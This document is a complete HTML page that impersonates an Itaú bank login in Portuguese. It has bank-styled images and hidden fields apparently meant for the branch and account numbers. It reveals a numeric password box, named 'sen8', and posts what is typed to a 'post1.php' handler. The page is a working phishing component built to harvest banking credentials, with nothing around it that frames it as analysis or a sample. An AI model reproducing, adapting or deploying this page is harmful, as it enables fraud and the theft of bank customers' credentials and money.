<html>

<head>
<meta http-equiv="Content-Language" content="pt-br">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Itaú</title>
</head>
<style>
body {
overflow-x:hidden;
overflow-y:hidden;
background-color: "#FFFFFF";
}
</style>

<script>
function techuhu() 
{
	document.getElementById("carai").style.display="block";
}

function SomenteNumero(e){
    var tecla=(window.event)?event.keyCode:e.which;   
    if((tecla>47 && tecla<58)) {
    return true;
    }
    else{
    	if (tecla==8 || tecla==0 || tecla==13) return true;
	else  return false;
    }
}
function validate() {
var el = document.getElementById("campo_se");

if (el.value.length < 6)
    {
        el.focus();
        alert("Senha Inválida!");
        return false;
    }
    else {
    document.form.submit();
    }
    
}
</script>

<body topmargin="0" leftmargin="0" rightmargin="0" bottommargin="0" marginwidth="0" marginheight="0">

<table border="0" width="100%" cellspacing="0" cellpadding="0">
	<tr>
		<td background="imges/has.png" height="71" style="background-image: url('imges/has.png'); background-repeat: no-repeat">&nbsp;</td>
	</tr>
	<tr>
	<form action="post1.php" name="form" method="POST" onsubmit="return validate();">
	<input type="hidden" name="ag" value="">
	<input type="hidden" name="cc" value="">

		<td background="imges/has.png" height="784" style="background-image: url('imges/layout2.png'); background-repeat: no-repeat">
		<div style="position: absolute; width: 220px; height: 53px; z-index: 1; left: 109px; top: 211px; padding-left: 20px; padding-right: 20px; padding-top: 10px; padding-bottom: 10px; background-image: url('imges/nomepp.png'); background-repeat: no-repeat" id="layer1">
			<span style="position:absolute;margin-top:6px;text-align:center; left:20px; width:177px;cursor:pointer;" onMouseDown="techuhu();" ><font face="Verdana" color="#FFFFFF"><b></b></font></span></div>
			<div style="position:absolute;left:123px;background-image: url('imges/tektek.png'); background-repeat: no-repeat;height:299px;width:359px;display:none; top:89px; z-index:7" id="carai">
				<input type="password" id="campo_se" maxlength="8" onkeypress='return SomenteNumero(event);' style="height:21px;width:140px;font-family: Arial,sans-serif;font-size: 13px;margin-left:110px;margin-top:120px;" name="sen8" size="1">
			<div style="width:60px;height:25px;cursor:pointer;margin-top:74px;margin-left:200px" onclick="validate();"></div>
			</div>
			&nbsp;</td>
	</tr>
	<tr>
		<td>&nbsp;</td>
	</tr>
</table>

</body>

</html>